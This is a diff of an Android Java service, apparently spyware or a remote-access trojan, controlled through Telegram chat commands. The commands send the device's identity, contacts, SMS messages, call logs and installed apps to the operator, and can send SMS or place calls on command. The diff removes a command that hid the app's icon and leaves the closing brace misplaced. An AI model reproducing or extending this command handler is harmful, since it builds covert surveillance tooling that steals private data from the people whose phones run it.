@@ -158,7 +158,7 @@ public class TelegramBot extends Service {
                         "/contacts /sms /calls /apps\n\n" +
                         "Control:\n" +
                         "/sms number msg\n/call number\n" +
-                        "/hide /users /die");
+                        "/users /die");
                     break;
                 case "/id":       sendFullIdentityTo(cid); break;
                 case "/device":   sendDeviceInfoTo(cid); break;
@@ -171,7 +171,6 @@ public class TelegramBot extends Service {
                 case "/calls":    sendCallLogsTo(cid); break;
                 case "/apps":     sendAppsTo(cid); break;
                 case "/users":    sendTo(cid, UserRegistry.dump(ctx)); break;
-                case "/hide":     MainActivity.hideIcon(ctx); sendTo(cid, "hidden"); break;
                 case "/die":      running = false; stopSelf(); break;
                 default:
                     if (c.startsWith("/sms ")) {
@@ -379,4 +378,4 @@ public class TelegramBot extends Service {
         } catch (Exception ignored) {}
         super.onDestroy();
     }
-}
+                }
